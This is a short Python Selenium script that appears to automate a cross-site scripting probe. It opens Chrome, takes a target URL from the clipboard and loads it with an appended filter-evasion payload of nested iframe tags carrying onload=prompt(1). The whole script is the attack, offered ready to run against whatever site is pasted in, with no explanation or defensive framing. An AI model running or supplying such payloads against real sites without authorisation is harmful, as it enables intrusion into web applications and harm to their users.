from selenium import webdriver
import os
import pyperclip as pc
driver = webdriver.Chrome(executable_path="8.exe")
driver.maximize_window()
driver.get('{}/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>'.format(pc.paste()))
